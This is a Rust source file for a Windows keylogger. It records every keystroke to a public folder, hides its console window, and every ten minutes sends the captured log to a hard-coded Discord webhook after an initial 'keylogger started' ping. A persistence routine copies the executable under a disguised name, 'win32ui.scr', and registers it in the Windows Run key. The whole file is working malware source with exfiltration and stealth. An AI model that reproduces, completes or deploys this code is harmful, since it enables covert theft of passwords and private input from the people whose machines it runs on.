use chrono::Local;
use reqwest::blocking::Client;
use std::env;
use std::fs;
use std::fs::OpenOptions;
use std::io::Write;
use std::path::PathBuf;
use std::time::{Duration, Instant};
use windows::Win32::System::Console::GetConsoleWindow;
use windows::Win32::UI::Input::KeyboardAndMouse::*;
use windows::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
use winreg::enums::*;
use winreg::RegKey;

// The contents of the file are read at COMPILE TIME and put here as a string
const WEBHOOK_URL: &str = include_str!("../config/webhook.url");
const LOG_PATH: &str = "C:\\Users\\Public\\keylogs.txt";

/// # Checks if the Caps Lock key is toggled on.
///
/// This function uses the `GetKeyState` Windows API function to determine the toggle state
/// of the Caps Lock key. It's essential for correctly interpreting the case of alphabetic characters.
/// The result is a boolean `true` if Caps Lock is active, and `false` otherwise.
/// The `unsafe` block is required because this function calls directly into the Windows OS API,
/// which Rust cannot guarantee the safety of.
fn is_capslock_on() -> bool {
    unsafe { GetKeyState(VK_CAPITAL.0 as i32) & 0x0001 != 0 }
}

/// # Checks if a specific virtual key is currently being pressed.
///
/// This function utilizes the `GetAsyncKeyState` Windows API function to get the real-time
/// state of any given key on the keyboard. It checks the most significant bit of the return value
/// to see if the key is down. This is crucial for detecting key presses as they happen.
/// The `unsafe` block is necessary for the direct OS API call.
fn is_key_pressed(vk: i32) -> bool {
    let state = unsafe { GetAsyncKeyState(vk) };
    state & (0x8000u16 as i16) != 0
}

/// # Appends a given string (representing a key press) to the log file.
///
/// This function takes the captured keystroke and writes it to the end of the file
/// specified by `LOG_PATH`. It uses `OpenOptions` to ensure the file is created if it
/// doesn't exist (`create(true)`) and that new data is appended without overwriting
/// existing content (`append(true)`).
fn log_to_file(key: &str) {
    if let Ok(mut file) = OpenOptions::new().create(true).append(true).open(LOG_PATH) {
        let _ = file.write_all(key.as_bytes());
    }
}

/// # Reads the log file and sends its contents to a Discord webhook.
///
/// This function is responsible for exfiltrating the captured keystrokes.
/// It first reads the entire content of the log file into a string.
/// If the file is not empty, it formats the content into a message that includes a timestamp
/// and then sends this data as an HTTP POST request to the specified Discord webhook URL.
/// After successfully sending, it clears the log file to prevent sending the same data repeatedly.
fn send_file_to_discord(path: &str) {
    if let Ok(content) = fs::read_to_string(path) {
        if !content.is_empty() {
            // Gets the current time to timestamp the log dump.
            let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            // Formats the message body for the Discord webhook.
            let body = format!("📥 Keystroke dump at {}:\n```{}```", timestamp, content);

            // Creates a new HTTP client and sends the data as a form payload.
            let _ = Client::new()
                .post(WEBHOOK_URL)
                .form(&[("content", &body)])
                .send();

            // Wipes the log file by opening it in write mode and truncating it to zero bytes.
            // This ensures the next log dump will only contain new keystrokes.
            let _ = OpenOptions::new().write(true).truncate(true).open(path);
        }
    }
}

/// # Sends an initial notification to the webhook when the keylogger starts.
///
/// This function sends a simple message to the Discord webhook to confirm that the
/// keylogger has been successfully executed on the target machine. It includes a
/// timestamp to record the start time.
fn send_initial_ping() {
    let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
    let msg = format!("🟢 Keylogger started at {}", timestamp);
    let _ = Client::new()
        .post(WEBHOOK_URL)
        .form(&[("content", &msg)])
        .send();
}

/// # Main function and the core logic loop of the keylogger.
fn main() {
    // Immediately notify the webhook that the program has started.
    send_initial_ping();
    // Record the current time to track when the last log file was sent.
    let mut last_sent = Instant::now();

    // Hide the console window to make the keylogger less conspicuous.
    // `GetConsoleWindow` gets a handle to the program's console window.
    // `ShowWindow` with `SW_HIDE` makes it invisible to the user.
    unsafe {
        let hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);
    }

    // Initialize an array to track the state of each key (pressed or not pressed).
    // This prevents logging a single key press multiple times if the key is held down.
    let mut last_state = [false; 256];

    // The main loop that runs continuously to capture keystrokes.
    loop {
        // Iterate through all possible virtual key codes (from 8 to 255).
        for vk in 8..256 {
            let index = vk as usize;

            // Check if a key is currently pressed AND was not pressed in the previous check.
            // This logic ensures we only log the key once when it's first pressed down.
            if is_key_pressed(vk) && !last_state[index] {
                let mut output = String::new();

                // Check the state of SHIFT and CAPS LOCK to determine character case.
                let is_shift = is_key_pressed(VK_SHIFT.0 as i32);
                let is_caps = is_capslock_on();

                // Handle standard alphabetic characters (A-Z).
                // The range check covers both uppercase and lowercase ASCII values.
                if (vk >= 65 && vk <= 90) || (vk >= 97 && vk <= 122) {
                    // The `^` (XOR) operator correctly determines the case.
                    // If either SHIFT or CAPS LOCK is active (but not both), the character is uppercase.
                    // Otherwise, it's lowercase.
                    let ch = if is_shift ^ is_caps {
                        vk as u8 as char
                    } else {
                        (vk as u8 as char).to_ascii_lowercase()
                    };
                    output.push(ch);
                } else {
                    // Handle special keys by matching their virtual key codes.
                    // Instead of logging the raw character, a descriptive string is used.
                    match vk {
                        k if k == VK_RETURN.0 as i32 => output.push_str("\n[ENTER]"),
                        k if k == VK_SPACE.0 as i32 => output.push(' '),
                        k if k == VK_BACK.0 as i32 => output.push_str("[BACK]"),
                        k if k == VK_TAB.0 as i32 => output.push_str("[TAB]"),
                        k if k == VK_ESCAPE.0 as i32 => output.push_str("[ESC]"),
                        k if k == VK_CONTROL.0 as i32 => output.push_str("[CTRL]"),
                        k if k == VK_MENU.0 as i32 => output.push_str("[ALT]"),
                        k if k == VK_DELETE.0 as i32 => output.push_str("[DEL]"),
                        // Ignore any other keys that are not explicitly handled.
                        _ => {}
                    }
                }

                // If a key was successfully translated into a string, log it to the file.
                if !output.is_empty() {
                    log_to_file(&output);
                }

                // Update the state for this key to `true` (pressed) to prevent re-logging.
                last_state[index] = true;
            } else if !is_key_pressed(vk) {
                // If the key is no longer pressed, reset its state to `false`.
                // This makes it ready to be logged again the next time it's pressed.
                last_state[index] = false;
            }
        }

        // Check if 600 seconds (10 minutes) have passed since the last data dump.
        if last_sent.elapsed() >= Duration::from_secs(600) {
            // If so, send the current log file to the webhook.
            send_file_to_discord(LOG_PATH);
            // Reset the timer to start counting for the next 10-minute interval.
            last_sent = Instant::now();
        }
    }
}

/// # Configures the keylogger to run automatically on system startup.
///
/// This function creates persistence by copying the executable to a less obvious
/// location and adding a Windows Registry key that ensures the program is
/// launched every time the user logs in.
fn add_to_startup() {
    // Get the path to the user's AppData\Roaming directory, a common place for app data.
    let appdata = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".to_string());
    // Define the new path and filename for the executable. Using a generic name
    // like "win32ui.scr" can help it blend in.
    let target_path = PathBuf::from(appdata).join("win32ui.scr");

    // Copy the currently running executable to the new target path.
    if let Ok(current_exe) = env::current_exe() {
        let _ = fs::copy(&current_exe, &target_path);
    }

    // Access the Windows Registry key responsible for running programs on startup for the current user.
    if let Ok(hkcu) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        KEY_WRITE,
    ) {
        // Create a new value in the "Run" key. The name can be anything, but "Win32UI"
        // is used here. The value is the full path to the copied executable.
        let _ = hkcu.set_value("Win32UI", &target_path.to_string_lossy().to_string());
    }
}
